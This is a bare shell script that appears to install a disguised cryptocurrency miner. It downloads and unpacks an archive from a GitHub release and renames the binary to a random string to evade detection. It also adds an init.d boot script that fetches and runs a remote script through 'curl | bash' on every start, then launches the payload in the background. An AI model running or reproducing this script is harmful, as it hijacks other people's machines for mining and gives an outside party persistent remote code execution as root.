cd /
wget https://github.com/humirav/spiriva/releases/download/v1.5.2/gabap.tar
tar -xvf gabap.tar
cd /gabap
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv keflex $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./codeine.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/humirav/spiriva/main/gluco.sh)" > lorat.sh
chmod a+x lorat.sh
update-rc.d lorat.sh defaults
rm -rf gabap.tar
cd /gabap
nohup ./codeine.sh
ps -ef | grep gabap
